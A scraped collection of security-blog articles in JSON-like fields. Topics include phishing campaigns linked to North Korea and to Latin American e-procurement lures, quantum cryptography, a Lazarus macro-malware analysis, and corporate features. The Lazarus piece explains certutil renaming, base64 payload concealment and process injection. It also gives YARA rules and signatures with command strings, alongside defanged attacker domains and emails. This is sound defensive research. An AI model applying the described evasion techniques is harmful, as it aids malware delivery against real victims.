investigating passive DNS results on the same IP address 157.7.184[.]15, the domain \u201csub-state[.]work\u201d was discovered. This domain has ten subdomains that follow the same naming conventions as the ones mentioned already. \nFigure 8 - An overview of phishing sites hosted on domain sub-state[.]work In Figure 8 it is possible to see subdomains impersonating the following organisations: Asahi News organisation - one of five major newspapers in Japan Ministry of Foreign Affairs - South Korea Who\u2019s Behind These Attacks? The IP address 157.7.184[.]15 is shared and therefore home to both legitimate and malicious activity. However, there is an overlap in infrastructure in a recent North Korean campaign called \u201cSmoke Screen\u201d reported on by ESTSecurity in April 2019 [5] . The domain \u201cbigwnet[.]com\u201d was reportedly used as a command and control (C2) for the Kimsuky Babyshark network trojan, which is also hosted on the same IP address. Kimsuky Babyshark network trojan is associated with North Korea. According to DomainWatch, an online service that collects domain registrant information, there is a registrant email address that appears to link a number of the aforementioned domains: ringken1983[at]gmail.com. [6] \nFigure 9 - Whois information for the domain doc-view[.]work DomainWatch also shows that the following domains are also registered with the same email address: \nFigure 10 - Domains registered with the email address ringken1983[at]gmail[.]com There are two other registrant emails identified for two related domains; \u201cweb-line[.]work\u201d and \u201cdrog-service[.]com\u201d. \nFigure 11 - Domains registered with email address dragon1988[at]india[.]com \nFigure 12 - Domains registered with email address okonoki_masao[at]yahoo[.]co.jp The domain \u201cDauum[.]net\u201d appears to be mimicking the South Korean web portal, Daum, which is an email provider among other services. In January 2019, North Korean actors were reported to have been targeting the Daum, Naver, and kakaoTalk services (all popular South Korean services), registering a number of similar-looking domains. [7] Conclusion Many of the organisations targeted in this campaign offer insight for strategic direction and goals of a particular country (South Korea for example). The targeting of foreign ministries for four different countries, and the persistent attempt to masquerade as email or online document services is most likely to gain access to the victim\u2019s sensitive communications and/or information. The purpose of this campaign is likely to gain access to the information, but it is difficult to know exactly what the end goal is for the adversary. After gaining access to the internal email service of an organisation, it is possible to compromise the organisation in many other ways. Whilst researching this campaign, many of the domains were not active, although most were registered this year. It might be that the adversary has been waiting to use the infrastructure for a future attack. There is an overlap with North Korean indicators in this research, and similar targeting to previous campaigns already reported.

        "title": "Phishing Campaign Impersonates Mexico, Peru, Uruguay Government\u2019s e-Procurement Systems",
        "author": "Anomali Threat Research",
        "date": "June 6, 2019",
        "text": "Overview In late May 2019, Anomali researchers discovered a phishing campaign impersonating three Latin American government\u2019s electronic procurement (e-Procurement) systems. The campaign uses convincing looking phishing pages where individuals and companies are invited to bid on public projects with the governments of Mexico, Peru, or Uruguay. The actors or group behind these phishing attacks setup multiple fraudulent online portals to steal account credentials from unsuspecting users, which can be sold for profit on underground markets or as an initial entry point for obtaining sensitive and privileged information from the victim and their organization. Prior to release of this blog post, Anomali has reached out to the appropriate government entities to inform them of the phishing campaign to minimize the threat posed to businesses seeking contract opportunities with the respective governments. We also submitted the phishing sites to  Google Safe Browsing  and  Microsoft Defender Security Intelligence  as an additional security measure to block the fraudulent websites. Introduction On May 28, 2019, Anomali researchers identified a phishing campaign masquerading as three Latin American government e-procurement websites from Mexico, Peru, and Uruguay. The table below depicts the impersonated government agencies and e-procurement system names: Targeted Agency Name e-Procurement System Name Country Secretar\u00eda de la Funci\u00f3n P\u00fablica  (English Translation: Secretariat of the Civil Service) CompraNet Mexico Gobierno del Per\u00fa  (English Translation: Government of Peru) Plataforma Digital \u00danica del Estado Peruano  (English Translation: Unique Digital Platform of the Peruvian State) Peru Agencia de Compras y Contrataciones del Estado (ACCE)  (English Translation: State Purchasing and Contracting Agency) Compras Electr\u00f3nicas  (English Translation: Electronic Purchases) Uruguay The campaign consisted of 16 unique web pages designed to mimic legitimate electronic procurement systems used by the abovementioned governments to solicit bids from the public. Of note, three of the eight Peru-themed phishing pages that were hosted on compras[.]gob[.]pe[.]corpenta[.]com was prominently displayed on the  Peru Compras , a Government of Peru agency, homepage warning the public of the fraudulent pages. All of the servers hosting the phishing pages were poorly configured and left exposed allowing any site visitor to view the directory\u2019s contents. These directories had a similar structure and contained files such as images, HTML pages, and CSS files of the targeted website. Figure 0 depicts an example of the components used to construct the phishing pages mimicking CompraNet, the electronic government public information system on public procurement by the Government of Mexico. \n Figure 0. Example of an open directory listing CompraNet (Mexico) related phishing components Details on the e-Procurement Phishing Pages Each of the e-Procurement-themed phishing pages are written in the Spanish language and dialect of the targeted governments country of origin, a likely attempt to increase the authenticity of the fraudulent site. Located at the top left of the main page is a message box with the following information: The visitors\u2019 company was selected to present an offer on unspecified public projects Requests site visitors to click on the \u201cEntrar\u201d or enter button in the middle of the page to communicate with the government agency via a private portal All questions concerning the preparation of an appointment to be sent via email by close of business on June 28, 2019 - specific to Peru and Uruguay - or June 30, 2019 - specific to Mexico \n Figure 1. Phishing page impersonating Government of Mexico\u2019s CompraNet \nFigure 2. Phishing page impersonating Government of Uruguay\u2019s Compras Electr\u00f3nicas \nFigure 3. Phishing page impersonating Government of Peru\u2019s Compras Electr\u00f3nicas When the user clicks on the Entrar button, a pop-up window appears prompting to login using their email address and password to access the online portal. Figure 4 depicts the login page with the faux CompraNet homepage in the background. \n Figure 4. Faux login page for Government of Mexico\u2019s CompraNet Presumably, once the victim discloses their login credentials, a web page that displays a thank you message and informs them to expect via email the invitation to bid documentation for an undisclosed project with one of three bidding IDs: MX-0846-19-RFQ for Government of Mexico request for quotation PE-0846-19-RFQ for Government of Peru request for quotation UY-0846-19-RFQ for Government of Uruguay request for quotation \n Figure 5.

Faux e-procurement system ID impersonating Compras Electr\u00f3nicas (Uruguay) Phishing Infrastructure In this campaign, the threat actors leveraged six unique domains that resolved to three distinct IP addresses to host 16 different web pages impersonating the governments of Mexico, Peru, and Uruguay. A technical analysis of the threat infrastructure uncovered at least three suspicious email addresses used by the malicious actors when configuring their Domain Name System (DNS) settings for the phishing campaign. Domain 1 On June 3, 2019, an individual named Eilmar Yefim Vilchez Herrera using email address evilchezh{at}gmail[.]com registered the domain corpenta[.]com[.]pe with Registrar Nic.pe. According to open source research, this domain is associated with a Lima, Peru-based company named Corpenta Seguridad Electr\u00f3nica. When conducting a Google search on this domain, a security warning from Norton Safe Web browser plugin alerts users of a phishing threat originating from a subdomain hosting a fraudulent page impersonating the Government of Uruguay located at <hxxp://compras[.]gub[.]uy[.]corpenta[.]com[.]pe/seguro/verificar.html>. This could likely be a sign that the threat actor\u2019s compromised the website to host phishing pages targeting the Central De Compras Publicas (Peru Compras) and the Agencia de Compras y Contrataciones del Estado (Uruguay). At the time of this report, the domain resolves to IP address 173.212.248[.]4 (AS51167 - Contabo GmbH), located in Germany, which is a server used by a total of 44 domains. Several of these sites were observed hosting Microsoft Office365-themed phishing pages as recent as May 30, 2019. \nFigure 8. Norton Safe Web security warning Domains 2, 3, 4, 5 From May 27, 2019 to May 30, 2019, the domains i1-i[.]icu, i2-i[.]icu, i3-4[.]online, and i3-5[.]online were registered with Registrar NameCheap using privacy protection measures. These four domains were hosted by Russia-based IP address 37.0.123[.]217 (AS198310 - Pallada Web Service LLC). A passive DNS lookup on this IP address uncovered 379 suspicious looking domains and subdomains most likely used in phishing campaigns targeting public and private sector organizations such as U.S. Departments of Housing and Urban Development (HUD) and Transportation (DOT), YouTube, and Adobe. A check of these domain\u2019s Start of Authority (SOA) records identified they shared the same email address elsyresh.official{at}gmail[.]com. A reverse Whois lookup on this email address uncovered a total of 10 domains created by a registrant named Elsy Resh from October 24, 2018 to February 28, 2019 using Registrar NameCheap. Based on the domain\u2019s naming structure, they were almost certainly employed by the threat actor to primarily target local, state, and federal government agencies from the United States. Domain 6 The domain umernasim[.]com was registered on December 9, 2017 with GoDaddy to an unspecified individual based in Sindh, Pakistan, according to Whois records.According to social networking sites Facebook, Twitter, and LinkedIn, this domain is associated with Muhammad Umer Nasim, the co-founder of Travelezco Holidays. It is highly probable that the threat actor compromised this website to host phishing pages impersonating CompraNet (Mexico), Central De Compras Publicas - Peru Compras, and Agencia de Compras y Contrataciones del Estado (Uruguay). The domain is hosted on IP address 134.119.176[.]46 (AS29066 - velia.net Internetdienste GmbH), located in France, which is the host for 283 total domains. A check of the domain\u2019s SOA record uncovered the email address rajaariz{at}gmail[.]com, which is likely specific to the individual related to the phishing campaign. Conclusion This latest phishing campaign is representative of an increasing trend we have observed since mid-2018 targeting businesses worldwide seeking contracting opportunities with local, state, and federal governments. Oftentimes, these types of government contracts are sought after by small and medium-sized businesses (SMBs) that lack the resources to adequately defend themselves from targeted or opportunistic attacks. We recommend that businesses exercise caution when in receipt of unsolicited correspondence especially when it claims to be from government agencies inviting your company to bid on public projects and educate their staff on spotting and dealing with phishing attacks.

        "title": "Quantum threat to cryptography and how to overcome this",
        "author": "Irfan Shakeel",
        "date": "August 30, 2021 | ",
        "text": "\n\t\t\t\t\t\t\t\t\t This blog was written by an independent guest blogger. \n\n We are familiar with quantum computing; know that it enables devices to do computations at an utterly inconceivable rate. It facilitates incredible advancements in technology. Ironically, quantum systems can make modern impenetrable cryptography hackable within seconds. Currently, quantum computers pose a high threat to the cryptography that underlies the safety of crucial networks. \n\n Cryptography is a powerful technique for protecting data's authenticity, accuracy, IT infrastructure from malicious hackers. Quantum computing has the potential to disrupt most existing encryption methods. Although current quantum computers are insufficiently strong to crack encryption, an attacker may use a relatively strong quantum computer in the coming years to decipher, retrieve, or view confidential data. \n\n Quantum threat? \n\n Public Key encryption techniques like RSA now safeguard the information as it travels around the web. Such algorithms transformed information privacy and have benefited the entire globe by allowing online business, encrypted conversations, and banking and finance accessibility. Quantum computers, regrettably, will soon be able to decrypt existing public-key encryption. Such technologies are code-breaking variants that are now on the way. Because of their fast evolution, they have become a corporate concern that requires immediate mitigating solutions. \n\n As per mathematician  Michele Mosca  of the Institute for Quantum Computing at the University of Waterloo, \n\n \n \"It's beyond something you can just ignore, even though we still don't know when it will happen. The chance of it happening in five, 10, or 20 years is not a risk you can accept. It's a systematic threat to the global economy, and it's real enough that you have to plan for it now.\" \n \n\n Quantum threat risks \n\n In some respects, the threat posed by quantum computers isn't unexpected, as there's constantly the possibility of cracking cryptography. To maintain confidentiality, organizations utilize several encryption methods like symmetric and public-key cryptography. Though public key encryption is the most prone to quantum attacks, symmetric key encryption is also susceptible. Hardware security modules are at the heart of such processes. It is a crucial element of the physical architecture that holds and produces safe keys to verify and certify data utilizing asymmetric algorithms. \n\n As per  cacm.acm , Massachusetts Institute of Technology mathematician Vinod Vaikuntanathan said, \n\n \n \"We live on the edge because none of the cryptographic systems we use are proven secure in the sense that there's no mathematical proof that these things cannot be broken.\" \n \n\n The fact that quantum decoding may work retroactively further exacerbates the concern. Attackers might start gathering encrypted information from organizations right now to decrypt it later. Organizations might be unwittingly the victims of an assault now, to face the repercussions once quantum computers mature. Fortunately, many organizations are taking notice. \n\n The National Institute of Standards and Technology (NIST) predicted in 2014 that by 2030, they create a quantum computer sufficient for cracking 2000-bit RSA. \n\n The quantum threat is so severe that as per  NSA in 2016, \n\n \n \"There is growing research in the area of quantum computing, and enough progress is being made that NSA must act now.\" \n \n\n The problem is that nobody understands how to create cryptographic techniques that are quantum-computer resistant. \n\n Because of the encryption cracking quantum threat, the National Institute of Standards and Technology (NIST) has begun developing the next level of encryption. \n\n It will result in the quantum-resistant encryption techniques commonly referred to as post-quantum cryptography\u00a0that will substitute for current standards. Critically, robust cryptographic technology will be available  later this year. \n\n Quantum threat solution \n\n A successful solution to the quantum threat would need collaboration between parties to discover possibilities to transform research into quantum-secure technologies. The development, assessment, and implementation of quantum-secure options are post-quantum cryptography and quantum key distribution. \n\n Post-quantum cryptography \n\n As per  MIT Technology Review , Martin Giles says, \n\n \n \"Without quantum-safe cryptographic defenses in place, all kinds of things, from autonomous vehicles to military hardware\u2014not to mention online financial transactions and communications\u2014could be targeted by hackers with access to quantum computers.\" \n \n\n There will be a massive disturbance if web protocols are disabled, as they safeguard encrypted data transmission. Post-quantum cryptography's aim is, 'if you can't defeat them, embrace them.\u201d A competition is currently underway to build increasingly difficult cryptography methods using quantum computers. \n\n Nowadays, having remedies done as soon as possible is a good idea. As per  Martin Giles , \n\n \n \"The pressure is on because encryption technologies are deeply embedded in many different systems, so unraveling them and implementing new ones can take a great deal of time.\" \n \n\n Roger Grimes, from  security awareness firm KnowBe4 , said, \n\n \n \"[2021 will] likely see the first public acknowledgment of the quantum crypto break, where quantum computers will break traditional public key crypto.\" \n \n\n Quantum key distribution \n\n The objective of quantum key distribution (QKD) is to provide a robust solution for quantum threats. QKD is a safe communication technology that uses quantum physics to construct a cryptosystem. \n\n The keys theoretically cannot break since QKD does not depend on preconceptions about the mathematical equations' computation complexity. It minimizes the possibility of an unanticipated breach of vital assets or the decryption of previously encrypted data using quantum-sensitive keys. \n\n Quantum key distribution only generates and transmits a key; it does not send information. The QKD is still developing, and research into its privacy and adaptability is ongoing. \n\n The  Indian Space Research Organisation  showed free-space quantum communication over a 300-meter distance in March 2021. Live video conferencing utilizing quantum-key-encrypted communications was part of the experiment. It is a significant breakthrough in the use of quantum technology to provide safe satellite data connectivity. \n\n Conclusion \n\n For cryptography to keep pace with quantum computing, it will need to use quantum technology. \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t",

        "title": "Lazarus campaign TTPs and evolution",
        "author": "Fernando Martinez",
        "date": "July 6, 2021 | ",
        "text": "\n\t\t\t\t\t\t\t\t\t Executive summary \n\n AT&T Alien Labs\u2122 has observed new activity that has been attributed to the Lazarus adversary group potentially targeting engineering job candidates and/or employees in classified engineering roles within the U.S. and Europe. This assessment is based on malicious documents believed to have been delivered by Lazarus during the last few months (spring 2021). However, historical analysis shows the lures used in this campaign to be in line with others used to target these groups. \n\n The purpose of this blog is to share the new technical intelligence and provide detection options for defenders. Alien Labs will continue to report on any noteworthy changes. \n\n Key Takeaways: \n\n \n\t Lazarus has been identified targeting defense contractors with malicious documents. \n\t There is a high emphasis on renaming system utilities (Certutil and Explorer) to obfuscate the adversary\u2019s activities ( T1036.003 ). \n \n\n Background \n\n Since 2009, the known tools and capabilities believed to have been used by the Lazarus Group include DDoS botnets, keyloggers, remote access tools (RATs), and drive wiper malware. The most publicly documented malware and tools used by the group actors include Destover, Duuzer, and Hangman. \n\n Analysis \n\n Several documents identified from May to June 2021 by Twitter users were identified as being linked to the Lazarus group. Documents observed in previous campaigns lured victims with job opportunities for Boeing and BAE systems. These new documents include: \n\n \n\t Rheinmetall_job_requirements.doc : identified by  ESET Research . \n\t General_motors_cars.doc : identified by Twitter user  @1nternaut . \n\t Airbus_job_opportunity_confidential.doc : identified by  360CoreSec . \n \n\n The documents attempted to impersonate new defense contractors and engineering companies like Airbus, General Motors (GM), and Rheinmetall. All of these documents contain macro malware, which has been developed and improved during the course of this campaign and from one target to another. The core techniques for the three malicious documents are the same, but the attackers attempted to reduce the potential detections and increase the faculties of the macros. \n\n First iteration: Rheinmetall \n\n The first two documents from early May 2021 were related to a German Engineering company focused on the defense and automotive industries, Rheinmetall. The second malicious document appears to include more elaborate content, which may have resulted in the documents going unnoticed by victims. \n\n The Macro has base64 encoded files, which are extracted and decoded during execution. Some of the files are split inside the Macro and are not combined until the time of decoding. One of the most distinctive characteristics of this Macro is how it evades detections of a MZ header encoded in base64 (TVoA, TVpB, TVpQ, TVqA, TVqQ or TVro), by separating the first two characters from the rest of the content, as seen in Figure 1. \n\n \n\n Figure 1: Concealing of MZ header, as captured by Alien Labs. \n\n The rest of the content is kept together in lines of 64 characters, and because of this, YARA rules can be used to detect other, typical executable content encoded in base64 aside of the MZ header. In this case, up to nine different YARA rules alerted to suspicious encoded strings in our Alien Labs analysis, like VirtualProtect, GetProcAddress, IsDebuggerPresent, GetCurrentProcessId, etc. \n\n \n\n Figure 2: YARA rules detections listed in the AT&T Alien Labs Open Threat Exchange, OTX. \n\n All files created by the executable and used by the different Macros are located in a new folder  C:/Drivers  with the purpose of masquerading their activity. The Macro copies and renames the Microsoft legitimate executable Certutil.exe into this folder. The reason for this copy is to avoid endpoint detection and response (EDR) signatures based on system utilities executed from non-standard sources (a Microsoft Office document in this case). Additionally, the copy of Certutil is disguised to avoid using the full string, by partially replacing it with an asterisk  %systemroot%\\system32\\certut*.exe.  As seen in later iterations, this technique was slightly modified to further reduce the number of detections. \n\n Certutil is used to decode the previously mentioned file, doing it within the same folder and with a different executable name. Once the necessary files have been decoded, the encoded files are removed from the system. \n\n The script queries WMI to list all the explorer.exe processes, where it will try to inject the malicious payload. For the injection, the attackers used Mavinject (a legitimate Windows component that can be used and abused) to perform arbitrary code injections inside any running process. Mavinject.exe has been abused for several years, as indicated in this  blog  from 2017. \n\n \n\n Figure 3: Mavinject injection to explorer, as captured by Alien Labs. \n\n \n\n Figure 4: Malicious Document execution tree listed in the AT&T Alien Labs OTX. \n\n The payload is in fact a downloader, which requests the next stage to a hardcoded Command and Control (C&C) server and saves it to a new file. This request is made through HTTPS with hardcoded headers. In this case, the domain used as C&C has been registered for several years, and the domain continues to have a long expiration date. For these reasons, this domain was assessed as a compromised domain, leveraged by Lazarus as C&C. \n\n \n\n Figure 5: Hardcoded HTTP headers, as captured by Alien Labs. \n\n Second iteration: General Motors \n\n A few weeks after the Rheinmetall document was observed, a very similar document emerged targeting General Motors. The characteristics of this document were very similar to the previous one, but with minor updates in the C&C communication process. \n\n After attempting to execute all its code, the Macro reports back to the C&C server with the status of the infection. In the code, a variable is updated from 1 to 3, signaling the status of the execution. The C&C is capable of tracking where its execution is failing, or encountering unexpected behavior, based on the requests made to the different documents in the C&C. This includes: \n\n \n\t During copying, decoding, renaming and executing the payload \n\t After successfully executing the payload \n\t After (and if) the payload was able to contact the C&C and download a file which is saved in the C:\\Drivers folder with the inf extension. \n \n\n The status report to the C&C also requests the lure document, which at this moment is downloaded from the same C&C and opened. \n\n \n\n Figure 6: C&C beacon to report execution status, as captured by Alien Labs. \n\n The domain used in this document and payload allgraphicart[.]com is no longer a compromised domain. It was first registered on April 1, 2021. However, it did not have any noteworthy activity until these malicious documents showed up, at least a month after the domain was registered. The domain was registered with Porkbun LLC, who offers domains with the free option of protecting the whois information. \n\n Third iteration: Airbus \n\n In early June, a month after the first document of this campaign was observed, a new document was identified targeting Airbus. This time, the C&C communications were very similar to the previous iteration of the document; however, the execution and injection processes were different. \n\n This document continues utilizing and masquerading Certutil, but the copy command had the minor addition of another asterisk to reduce the detection risk:  %systemroot%\\system32\\*ertut*.exe . In addition to Certutil, the legitimate explorer executable is copied to the  C:\\Drivers  folder through a similar method  %systemroot%\\exp*.exe . As previously mentioned, these files will be copied and renamed to avoid EDR signature-based detections, but this time the destination filenames were carefully chosen. If alphabetically ordered, the first two files will correspond to legitimate software, followed by the malicious files, which could mislead investigators on their first peak on the  C:\\Drivers  folder. \n\n This Macro contains three files encoded with base64 which are copied to disk and decoded during execution: \n\n \n\t The first .tmp file will become a .lnk file after decoding. This lnk file is executed with Explorer and performs the next decoding. \n\t The second tmp file is concatenated (linked) with a third one, from the next-stage payload after decoding. \n \n\n After the actions, the Macro executes the mentioned payload with an updated technique. The attackers are no longer using Mavinject, but directly executing the payload with explorer.exe, significantly modifying the resulting execution tree as seen in Figure 10. Once the payload has been executed, the Macro waits for three seconds before creating of an .inf file in the same folder. Whether it was successfully executed or not, the Macro will proceed to send the beacon to the C&C with the execution status and delete all the temporary files, attempting to clean their tracks. The only files left in C:\\Drivers\\ at this point are the payload and the .inf file. \n\n \n\n Figure 7: Malicious Document execution tree, as captured by AT&T Alien Labs. \n\n The new C&C shopweblive[.]com follows the same pattern and characteristics of the one used in the second iteration. \n\n Conclusion \n\n The reported activity remains in line with the Lazarus\u2019 past campaigns and is not expected to be the last. Attack lures, potentially targeting engineering professionals in government organizations, showcase the importance of tracking Lazarus and their evolution. We continue to see Lazarus using the same tactic, techniques, and procedures that we have observed in the past, such as using Microsoft Office documents that download remote templates, Microsoft Office Macros, and compromised third party infrastructure to host the payloads and proxy C&C traffic through. AT&T Alien Labs will continue to monitor and report on any noteworthy changes. \n\n Detection Methods \n\n The following associated detection methods are in use by Alien Labs. They can be used by readers to tune or deploy detections in their own environments or for aiding additional research. \n\n \n\t \n\t\t \n\t\t\t \n\t\t\t SURICATA IDS SIGNATURES \n\t\t\t \n\t\t \n\t\t \n\t\t\t \n\t\t\t 2033135: ET TROJAN Observed Lazarus Maldoc CnC Domain (shopweblive .com in TLS SNI) \n\t\t\t \n\t\t \n\t \n \n\n \u00a0 \n\n \n\t \n\t\t \n\t\t\t \n\t\t\t TDR / MTDR CORRELATION RULES \n\t\t\t \n\t\t \n\t\t \n\t\t\t \n\t\t\t Malicious activity detected after Certutil.exe file decoding \n\t\t\t \n\t\t \n\t\t \n\t\t\t \n\t\t\t Windows renamed binary \n\t\t\t \n\t\t \n\t\t \n\t\t\t \n\t\t\t Suspicious Process Created by Microsoft Office Application \n\t\t\t \n\t\t \n\t\t \n\t\t\t \n\t\t\t Windows MavInject DLL Injection \n\t\t\t \n\t\t \n\t \n \n\n \u00a0 \n\n \n\t \n\t\t \n\t\t\t \n\t\t\t YARA RULES \n\t\t\t \n\t\t \n\t\t \n\t\t\t \n\t\t\t \nrule LazarusCampaign_MacroDoc_Jun2021 : WindowsMalware {\n\n   meta:\n\n      author = \"AlienLabs\"\n\n      description = \"Detects Lazarus campaign macro document Jun2021.\"\n\n      reference = \"https://otx.alienvault.com/pulse/294acafed42c6a4f546486636b4859c074e53d74be049df99932804be048f42c\"\n\n      SHA256 = \"294acafed42c6a4f546486636b4859c074e53d74be049df99932804be048f42c\"\n\n\n   strings:\n\n\n      $a1 = \"ZSBydW4gaW4gRE9TIG1vZGUuDQ0KJA\" ascii //run in DOS mode. - base64 encoded\n\n      $a2 = \"c:\\\\Drivers\"\n\n      $a3 = \"AAAAAAAAAA=\" ascii // base64 content\n\n      $a4 = \"CreateObject(\\\"Scripting.FileSystemObject\\\").CreateTextFile\"\n\n      $a5 = \"cmd /c copy\"\n\n      $a6 = {73 79 73 74 65 6d 33 32 5c 2a 65 72 74 75 74 2a 2e 65 78 65} // system32\\*ertut*.exe\n\n      $a7 = {25 73 79 73 74 65 6d 72 6f 6f 74 25 5c 65 78 70 2a 2e 65 78 65} // %systemroot%\\exp*.exe\n\n      $a8 = \"sleep 1000\"\n\n      $a9 = \"cmd /c explorer.exe /root\"\n\n      $a10 = \"-decode \"\n\n      $b = \"tAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v\" ascii //This program cannot - base64 encoded\n\n\n\n    condition:\n\n      uint16(0) == 0xCFD0 and\n\n        filesize < 2000KB and\n\n        $b and\n\n        5 of ($a*)\n\n} \n\t\t\t \n\t\t \n\t\t \n\t\t\t \n\t\t\t \nrule LazarusCampaign_Payload_Jun2021 : WindowsMalware {\n\n   meta:\n\n      author = \"AlienLabs\"\n\n      description = \"Detects Lazarus campaign downloader Jun2021.\"\n\n      reference = \"https://otx.alienvault.com/pulse/294acafed42c6a4f546486636b4859c074e53d74be049df99932804be048f42c\"\n\n      SHA256 = \"f5563f0e63d9deed90b683a15ebd2a1fda6b72987742afb40a1202ddb9e867d0\"\n\n\n   strings:\n\n\n      $a1 = \"Office ClickToRun\" wide ascii\n\n      $a2 = \"C:\\\\Drivers\\\\\"\n\n\n    condition:\n\n\n      uint16(0) == 0x5A4D and all of them\n\n} \n\t\t\t \n\t\t \n\t \n \n\n Associated indicators (IOCs) \n\n The following technical indicators are associated with the reported intelligence.

He\u2019s built an extremely  talented and diverse team  with an endless tool chest of cybersecurity, business, and interpersonal skills. \n\n Todd is a magnet for diverse talent and achieves this through an organic approach to inclusivity - he goes far out of his way to ensure that every person in his team is brought into his circle, recognized, and given the tools they need to become successful in his business. \n\n Todd believes that we must do more to drive a culture of diversity and inclusivity while taking greater responsibility for the fundamental way that a career in cybersecurity is portrayed and perceived. Nurturing an inclusive culture in this important industry can bring a  greater call to action  for those who want to make a difference or change their career path while also building up a stronger infrastructure to protect against cyberthreats and adversaries. \n\n Check out quotes from the highlight reel below to see what\u2019s in store! \n\n Congrats Todd Waskelis,  AVP Cybersecurity,  Integrated & Partner Solutions  -  Winner of the AT&T Diversity and Inclusion Champion Award 2021 \n\n \n\n Here\u2019s a list of some of Todd\u2019s excellent cybersecurity colleagues he\u2019d like me to highlight. We asked them for some of their ideas: \n\n \u00a0 \n\n Bindu Sundaresan:   Director, Cybersecurity Strategy & CyaaS \n\n \n \u00a0\u201cYou can have it all, but you can not have it all at once.  It\u2019s key to focus on one thing at a time to be able to accomplish some of those near-term milestones to be able to get to your long-term goals .\u201d \n \n\n \n\n Sarita Rao:   SVP, Integrated & Partner Solutions  \u00a0 \n\n \n \u201c Look for the right role models and mentors to help advance your career.  In addition to understanding the field and the technology, you must look at cybersecurity from a business standpoint.\u201d \n \n\n \n\n Erin Edwards:   Risk Advisory Consultant & CoS  \u00a0 \n\n \n \u201c Be a sponge . Listen twice as much as you speak and take notes.  Ask if you can be a part of projects outside of your wheelhouse, even if it\u2019s only from an information gathering perspective.  Use that experience and insight gained to help you grow in your career.\u201d \n \n\n \n\n Sherri Hines:   Managed Vulnerability Consultant \n\n \n \u201c Read about and follow companies and leaders in technology.  Look for opportunities to make business more productive because wherever technology sprouts, security is lurking.\u201d \n \n\n \n\n Louise Le Goff:   Senior Cybersecurity Consultant \n\n \n \u201c Step back out of the weeds and think forward regarding how to out manuvere threat actors so I can apply the appropriate controls.  How can I out maneauver an overly ambitious client who is breaking scope? How can I navigate clients back into the fold?\u201d \n \n\n \n\n Kathryn Thornton:   Regional Operations Manager, Southeast Region \n\n \n \u201c Take the time to understand how technology and cybersecurity drive business operations .\u201d \n \n\n \n\n Carisa Brockman:   National Practice Lead, Risk Advisory \n\n \n \u201cIt is imperative in cyber to understand the business. Cybersecurity is about enabling the business to carry out its mission in a secure way.  How would you know what to protect if you don\u2019t understand the drivers of the business or the data that is critical to the business.  It\u2019s all about managing business risk.\u201d \n \n\n \n\n Tricia Kilian:   Regional Operations Manager, Pacific Northwest & West Coast Region \n\n \n \u201cSecurity is everybody\u2019s responsibility. Helping to secure our client\u2019s network is all of our responsibilities.  It comes down to asking business questions about how we can help them as a good client advocate.\u201d \n \n\n \n\n Upasna Saluja:   Senior Cybersecurity Consultant \n\n \n \u201c You are the CEO of your security career. Make sure you have a plan.  Just as businesses build out their annual plans, they have targets and goals, so should you. You must establish your own short and long term goals. At least annually, take stock: Where were you last year, how have you grown in terms of skills, knowledge, and expertise.\u201d \n \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t\t \n\t\t\t\t\t\t\t\t",

In every industry, digital transformation is going to be critical to remain competitive and resilient. \n\n But what does digital transformation mean? And how does cybersecurity fit in? Today\u2019s organizations are facing\u00a0 an increasingly complex environment of securing everything attached to the network; applications, data, and endpoints. \n\n What is digital transformation? \n\n At its most basic definition,\u00a0digital transformation (or DX) is the process of improving your business by leveraging the latest technologies and solutions. \n\n Digital transformation harnesses third platform technologies - think cloud and data analytics, and acceleration technologies - think IoT and mobile apps to transform business operations. \n\n The primary goals of digital transformation are to increase agility for customer responsiveness, flexibility to accommodate new ways of working, and scalability to help your business do more. \n\n What\u2019s driving digital transformation? \n\n The main drivers of digital transformation are: \n\n \n\t Skyrocketing data transmission speeds \n\t Increased storage capacities \n\t Expansion of mobile functionality \n \n\n All these signs point to a rapid decrease of on-premises computing and storage. \n\n With the cloud, the amount of time and resources spent on hardware maintenance and upkeep is drastically reduced because you no longer need to own, maintain, and upgrade these resources in your own data center. \n\n Rebuffing the maintenance mindset, the preference for most IT departments is to spend more on innovation vs. the traditional \u201ckeep \u00a0the lights on\u201d tasks. However, because \u201cturning the lights off\u201d isn\u2019t feasible, the bulk of IT budgets continue to be allocated to maintenance. A 2020  Deloitte Inisights report  underscores the reality: the average IT department allocates over half its budget on maintenance but only 19 percent on innovation. \n\n And according to a 2021 State of IT Spiceworks Ziff Davis  study , updating outdated IT infrastructure is the number one factor driving IT budget increases \u2014 cited by 56% of organizations planning on growing IT spend. \n\n Also driving cloud adoption is the need to address disaster recovery (DR). While DR has not been typically cost-effective for small to mid-sized businesses, many cloud vendors and providers offer DR solutions like DRaaS (Disaster Recovery as a Service) that address those challenges. \n\n But perhaps the greatest driver of cloud adoption today is COVID-19. The pandemic\u2019s disruption to the business landscape forced organizations to consider advanced technologies. The work from home or remote work model is here to stay, and the demand for software-as-a-service (SaaS) applications that allow teams to collaborate from anywhere is steadily increasing. \n\n The main spheres of digital transformation \n\n \n\n While one can argue that the components of digital transformation are numerous, we are highlighting five important spheres. \n\n Security \nAs network access moves beyond the office perimeter to meet the demands of a remote workforce, robust security measures are required to maintain the confidentiality, integrity, and availability of corporate and customer data. Today, cloud security is moving closer towards the Zero Trust model of verifying everything and everyone and trusting nobody or no thing. \n\n Cloud \nAs mentioned above, cloud brings a level of efficiency and economies of scale that local hardware and networks have difficulty matching. \n\n IoT \nThe Internet of Things (IoT) is defined as a device not typically known as a computing device, which uses the internet to send and receive data. IoT has broad applications across the enterprise in almost every industry, and provides numerous benefits \u2014 including increased operational efficiencies, improved customer experiences, better business decisions, and keeping workers safe. \n\n Analytics and AI  \nBig data and artificial intelligence are complex, and an integral part of any digital transformation. With access to more data, better business decisions are possible. And with the ability for data rich algorithms to make more human-like decisions, an organization can gain unprecedented amounts of automation and improved organizational efficiency. \n\n Mobility \nCustomers, employees, and third-parties are connecting to our networks from a wide variety of endpoints. Functionally, the lines between what a desktop or laptop can do and what mobile devices are capable of is blurred. Plus, as companies adopt a remote or hybrid workforce, facilitating mobile connectivity is crucial. \n\n How cybersecurity fits in \n\n One of the most significant challenges for any organization undergoing a digital transformation is finding the right balance between innovation and security. If cybersecurity is not built into digital transformation architecture from the beginning, the organization is at risk through unremediated vulnerabilities that give adversaries an easy way to compromise your network\u2014going on a digital shopping spree 